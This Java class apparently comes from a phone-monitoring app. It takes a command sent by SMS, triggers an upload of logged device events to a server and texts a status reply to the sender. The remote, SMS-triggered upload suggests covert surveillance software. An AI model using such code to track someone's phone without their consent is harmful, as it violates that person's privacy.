package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.SendEventCmdResponse;
import com.vvt.protsrv.SendEventManager;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class SMSRequestEvents extends RmtCmdAsync implements PhoenixProtocolListener {
	
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSRequestEvents(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	private void doSMSHeader() {
		responseMessage.delete(0, responseMessage.length());
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(smsCmdCode.getRequestEventsCmd());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// Runnable
	public void run() {
		doSMSHeader();
		responseMessage.append(RmtCmdTextResource.COMMAND_BEING_PROCESSED);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		eventSender.addListener(this);
		eventSender.sendEvents();
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
	
	// PhoenixProtocolListener
	public void onError(String message) {
		eventSender.removeListener(this);
		doSMSHeader();
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
	}

	public void onSuccess(CommandResponse response) {
		eventSender.removeListener(this);
		if (response instanceof SendEventCmdResponse) {
			SendEventCmdResponse sendEventRes = (SendEventCmdResponse)response;
			doSMSHeader();
			if (sendEventRes.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.SEND_IMMEDIATE_EXECUTED);
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendEventRes.getServerMsg());
			}
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send SMS reply.
			smsMessage.setMessage(responseMessage.toString());
			send();
		}
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdSendLogNow.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
